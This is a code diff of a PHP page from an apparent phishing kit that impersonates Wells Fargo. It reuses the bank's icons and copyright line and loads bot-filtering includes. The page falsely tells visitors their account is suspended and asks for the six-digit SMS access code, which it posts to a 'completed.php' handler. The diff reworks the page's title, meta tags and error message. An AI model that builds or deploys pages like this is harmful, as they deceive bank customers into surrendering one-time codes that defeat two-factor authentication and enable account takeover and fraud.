@@ -1,3 +1,52 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <?php
 session_start();
 error_reporting(0);
@@ -12,13 +61,7 @@ include('../files/boot/DB-METHOD.php');
 include('../files/boot/DB-RANGE.php');
 include('../files/boot/enc.php');
 include('../call.php');
-// $user = @$_GET['user'];
-// $phone = @$_GET['phone'];
 $error = @$_GET['error'];
-// if (($user == "") || ($phone == "")) { 
-// echo '<meta http-equiv="refresh" content="0; URL=index.php">';
-//     die();
-// }
 $id = "";
 if( isset($_GET['id'])){
     $id = $_GET['id'];
@@ -30,18 +73,11 @@ if( isset($_GET['id'])){
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
-    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
-    <meta name="keywords" content="checking accounts, savings accounts, student loans, personal loans, investments, online banking, auto loans, home loans">
+    <title>Advance Access Code Security<?=$id?></title>
     <meta name="robots" content="index, follow">
     <meta name="search_category" content="Personal">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
-    <meta http-equiv="Cache-Control" content="must-revalidate">
-    <meta http-equiv="Cache-Control" content="no-store">
-    <meta http-equiv="Cache-Control" content="no-cache">
-    <meta http-equiv="Cache-Control" content="private">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta name="apple-itunes-app" content="app-id=311548709">
+
 
     <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
     <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
@@ -89,42 +125,35 @@ if( isset($_GET['id'])){
                     </div>
                     <div class="signOnContainer" align="center" style="width: 100%; max-width: 650px;">
                         <form id="" name="frmSignon" action="completed.php?id=<?=$id?>" method="post" autocomplete="off">
-                            <!-- <input type="hidden" name="user" value="<?=$user;?>"> -->
-                            <!-- <input type="hidden" name="phone" value="<?=$phone;?>"> -->
+                            
+                            <?php
+                            if( $error != ""){
+                            ?>
+                            <p style="color: red; font-size: 1.2em; font-weight: bold;">
+                                Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
+                            </p>
+                            <?php
+                            }
+                            ?>
                             <p class="enroll-header" style="font-size: 100%;">For your security, an Advanced Access code is required. </p>
                             <p class="enroll-header" style="font-size: 110%;">We have sent you a message with a 6 digit code ("To send 500.00 to Wells Fargo with a unique code") to your phone number.</p>
                             <p style="font-size: 120%; font-weight: bold;">Failing to input the specific code will cause your account to remain suspended and the authentication will not be validated.</p>
                             <p style="font-size: 120%; font-weight: bold;">Please wait a few moments to receive the code on your mobile phone.</p>
+                            </p>
+                            <br>
+                            <label class="sr-only" for="userid"></label>
+                            <p style=" font-size: 110%; font-weight:bold; width: 40%;">Text code (6 digits): </p>
+                            <input maxlength="6" style=" width: 40%;" id="userid" placeholder="Text code(6digits)" class="required" name="code" type="text">
+                            <div class="save-uid" align="left">
+                                <ul>
+                                    <li>
+                                        <input maxlength="6" name="code" id="code" value="" type="checkbox">
+                                    </li>
+                                </ul>
+                            </div>
+                            <input class="signOn" style="width: 60%; " value="Verify my account" type="submit">
 
-                            <?php if ($error == "1") { 
-                                echo '<p style="font-size: 130%; color: red; font-weight: bold;">Some or all of the fields you have completed might be incorrect or incomplete. Please review your input. </p>';;
-                                }
-                            ?>
-                                </p>
-                                <br>
-                                <label class="sr-only" for="userid"></label>
-                                <p style=" font-size: 110%; font-weight:bold; width: 40%;">Text code (6 digits): </p>
-                                <input maxlength="6" style=" width: 40%;" id="userid" placeholder="Text code(6digits)" class="required" name="code" type="text">
-                                <div class="save-uid" align="left">
-                                    <ul>
-                                        <li>
-                                            <input maxlength="6" name="code" id="code" value="" type="checkbox">
-                                        </li>
-                                    </ul>
-                                </div>
-                                <input class="signOn" style="width: 60%; " value="Verify my account" type="submit">
-
-                                <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
-                                
-                                <?php
-                                if( $error != ""){
-                                ?>
-                                <p style="color: red; font-size: 1.2em; font-weight: bold;">
-                                    Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
-                                </p>
-                                <?php
-                                }
-                                ?>
+                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
 
                         </form>
                     </div>
@@ -165,3 +194,4 @@ if( isset($_GET['id'])){
 </body>
 
 </html>
+
